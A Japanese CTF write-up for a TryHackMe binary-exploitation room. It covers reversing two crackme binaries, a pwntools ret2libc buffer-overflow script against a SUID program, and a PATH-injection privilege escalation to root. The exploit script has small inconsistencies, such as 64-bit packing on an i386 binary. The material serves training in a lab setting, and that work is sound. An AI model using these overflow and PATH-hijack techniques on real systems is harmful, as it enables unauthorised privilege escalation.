# Binary Heaven CTF

https://tryhackme.com/room/binaryheaven

## angel_A

```c
undefined8
main(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,
    undefined8 param_6)

{
  long lVar1;
  byte local_15 [9];
  int local_c;

  lVar1 = ptrace(PTRACE_TRACEME,0,1,0,param_5,param_6,param_2);
  if (lVar1 == -1) {
    printf("Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("\x1b[36m\nSay my username >> \x1b[0m");
  fgets((char *)local_15,9,stdin);
  local_c = 0;
  while( true ) {
    if (7 < local_c) {
      puts("\x1b[32m\nCorrect! That is my name!\x1b[0m");
      return 0;
    }
    if (*(int *)(username + (long)local_c * 4) != (char)(local_15[local_c] ^ 4) + 8) break;
    local_c = local_c + 1;
  }
  puts("\x1b[31m\nThat is not my username!\x1b[0m");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

文字と 4 との排他的論理和を取ったものに 8 を足し、username メモリの値と比較している。文字数は 7。

メモリ内容は下記。

```
00104060 6b              undefined16Bh                     [0]                               XREF[3]:     Entry Point(*), main:00101202(*),
00104064 79              undefined179h                     [4]
00104068 6d              undefined16Dh                     [8]
0010406c 7e              undefined17Eh                     [12]
00104070 68              undefined168h                     [16]
00104074 75              undefined175h                     [20]
00104078 6d              undefined16Dh                     [24]
0010407c 72              undefined172h                     [28]
```

8 をマイナスして、4 との排他的論理和を取り、ASCII 文字列として出力するプログラム。

```python
values = [0x6b, 0x79, 0x6d, 0x7e, 0x68, 0x75, 0x6d, 0x72]
processed_chars = [(v - 8) ^ 0x04 for v in values]
ascii_string = ''.join(chr(c) for c in processed_chars)
print(ascii_string)
```

```sh
$ python ./a.py
guardian
```

## angel_B

Go 言語の逆アセンブリでとても分かりにくいが、

```
                     LAB_004a54a1                                    XREF[1]:     004a5404(j)
                     password.go:14 (37)
004a54a1 48 89 04 24     MOV        qword ptr [RSP]=>local_c0,RAX
004a54a5 48 8d 05        LEA        RAX,[DAT_004cad0b]                               = 47h    G
         5f 58 02 00
004a54ac 48 89 44        MOV        qword ptr [RSP + local_b8],RAX=>DAT_004cad0b     = 47h    G
         24 08
004a54b1 48 89 4c        MOV        qword ptr [RSP + local_b0],RCX
         24 10
004a54b6 e8 25 ce        CALL       runtime.memequal                                 void runtime.memequal(void)
         f5 ff
004a54bb 80 7c 24        CMP        byte ptr [RSP + local_a8],0x0
         18 00
004a54c0 0f 84 44        JZ         LAB_004a540a
         ff ff ff
```

このアドレスにパスワード文字列が入っている。

```
                     DAT_004cad0b                                    XREF[2]:     main.main:004a54a5(*),
                                                                                  main.main:004a54ac(*)
004cad0b 47              ??         47h    G
004cad0c 4f              ??         4Fh    O
[REDACTED]
```

入手したユーザー名とパスワードを使って SSH 接続し、フラグ入手。

## pwn

```sh
guardian@heaven:~$ ls -al
total 52
drwxr-x--- 4 guardian guardian  4096 May  8  2021 .
drwxr-xr-x 5 root     root      4096 Mar  1  2021 ..
-rw-rw-r-- 1 guardian guardian     0 May  8  2021 .bash_history
-rw-r--r-- 1 guardian guardian   220 Mar  1  2021 .bash_logout
-rw-r--r-- 1 guardian guardian  3771 Mar  1  2021 .bashrc
drwx------ 3 guardian guardian  4096 Mar  4  2021 .cache
-rw-r--r-- 1 root     root        26 Mar 15  2021 guardian_flag.txt
drwxrwxr-x 2 guardian guardian  4096 Mar  4  2021 .nano
-rw-r--r-- 1 guardian guardian   655 Mar  1  2021 .profile
-rwsr-sr-x 1 binexgod binexgod 15772 May  8  2021 pwn_me
-rw------- 1 guardian guardian   228 May  8  2021 .python_history
```

```sh
$ pwn checksec ./pwn_me
[*] '/home/kali/ctf/binary/pwn_me'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
undefined4 main(void)
{
  __uid_t __euid;
  __uid_t __ruid;

  __euid = getuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  vuln();
  return 0;
}

void vuln(void)
{
  char local_20 [24];

  puts("Binexgod said he want to make this easy.");
  printf("System is at: %lp\n",system);
  gets(local_20);
  return;
}
```

- バッファの先頭から 32 バイト（バッファ 24 バイト＋ RBP8 バイト）の位置に、32 ビットで system 関数のアドレスを書き込む。
- 40 バイトの位置に system 関数の引数（/bin/sh 文字列へのアドレス）を書き込む。

どうやってバッファに書き込むかだが、pwn ツールがインストールされていた。

```sh
guardian@heaven:~$ which pwn
/usr/local/bin/pwn
```

```python
!/usr/bin/env python3
from pwn import *
import re

context.binary = binary = './pwn_me'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib32/libc.so.6')

p = process()

p.recvline()
line = p.recvline().decode().strip() # System is at: 0xf7da7220

match = re.search(r'0x[0-9a-fA-F]+', line)
if match:
    leak = int(match.group(0), 16)
    print("Address: " + str(leak))
else:
    print("Address not found.")
    exit

libc.address = leak - libc.symbols.system

payload = b'A'*32
payload += p64(leak)
payload += p64(next(libc.search(b'/bin/sh')))

p.sendline(payload)
p.interactive()
```

```sh
$ cat /home/binexgod/binexgod_flag.txt
THM{................}
```

## root

```sh
$ ls -al /home/binexgod
total 112
drwxr-x---  9 binexgod binexgod 4096 May  8  2021 .
drwxr-xr-x  5 root     root     4096 Mar  1  2021 ..
-rw-rw-r--  1 binexgod binexgod    0 May  8  2021 .bash_history
-rw-r--r--  1 binexgod binexgod  220 Mar  1  2021 .bash_logout
-rw-r--r--  1 binexgod binexgod 3771 Mar  1  2021 .bashrc
-rw-r--r--  1 binexgod binexgod   20 Mar  1  2021 binexgod_flag.txt
drwx------ 12 binexgod binexgod 4096 Mar  4  2021 .cache
drwx------ 14 binexgod binexgod 4096 Mar  4  2021 .config
drwx------  3 binexgod binexgod 4096 May  8  2021 .dbus
-rw-r--r--  1 binexgod binexgod   25 Mar  3  2021 .dmrc
drwx------  2 binexgod binexgod 4096 Mar  3  2021 .gconf
drwx------  3 binexgod binexgod 4096 May  8  2021 .gnupg
-rw-------  1 binexgod binexgod 2862 May  8  2021 .ICEauthority
drwx------  3 binexgod binexgod 4096 Mar  3  2021 .local
drwxrwxr-x  2 binexgod binexgod 4096 Mar  8  2021 .nano
-rw-r--r--  1 binexgod binexgod  655 Mar  1  2021 .profile
-r-xr-xr-x  1 root     root     6580 Mar  4  2021 secret_of_heaven
-rw-r-----  1 binexgod binexgod    5 May  8  2021 .vboxclient-clipboard.pid
-rw-r-----  1 binexgod binexgod    5 May  8  2021 .vboxclient-display-svga-x11.pid
-rw-r-----  1 binexgod binexgod    5 May  8  2021 .vboxclient-draganddrop.pid
-rw-r-----  1 binexgod binexgod    5 May  8  2021 .vboxclient-seamless.pid
-rwsr-xr-x  1 root     binexgod 8824 Mar 15  2021 vuln
-rwxr-xr--  1 root     binexgod  327 Mar  8  2021 vuln.c
-rw-------  1 binexgod binexgod   51 May  8  2021 .Xauthority
-rw-------  1 binexgod binexgod   82 May  8  2021 .xsession-errors
-rw-------  1 binexgod binexgod   82 May  8  2021 .xsession-errors.old
```

```sh
$ cat ./secret_of_heaven
#!/bin/bash

METANYAN="$(cat <<'EOT'
H4sIAHQtVlECA+2dS5rjJhCA93OK7CY5RBa5QPZZFu1uu2UQ99/FFCDQCwEq2bRVfI5bZMb/1AOw
[REDACTED]
JDdH3xD9rY40bayBOKps9qOccfi1BE4omOUt49lfqV0
5Lbb9Oxfv379D5cBOcrUGAEA
EOT
)"
eval $(echo $METANYAN | tr ' ' '\n' | base64 -d | gunzip)

...
```

実行すると、下記のような形式の長いテキストになった。  
うっすら、猫のようなシルエットが浮かぶがよく分からなかった。

```
NYAN=('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbmbbbbbbbbbbbbbbbbbbbbbbbbbbb'
      'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbmbmbbbbbbbbbbbbbbbbbbbbbbbbbb'
...
```

vuln に SUID が付いていて、vuln.c が置かれている。

```sh
$ cat /home/binexgod/vuln.c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
```

echo がフルパスになっていないので、PATH をインジェクションする。

```sh
$ cp /bin/sh ./echo
$ export PATH=/home/binexgod:$PATH
$ ./vuln
$ id
uid=0(root) gid=1001(guardian) groups=1001(guardian)
```

```sh
$ cat /root/root.txt
THM{...................}
```

## 振り返り

- Go 言語のリバースは初見。解読が難しく厄介だった。Go に関しては、ghidra の生成した C ソースコードは信用できないと思った。

## Tags

#tags:pwn
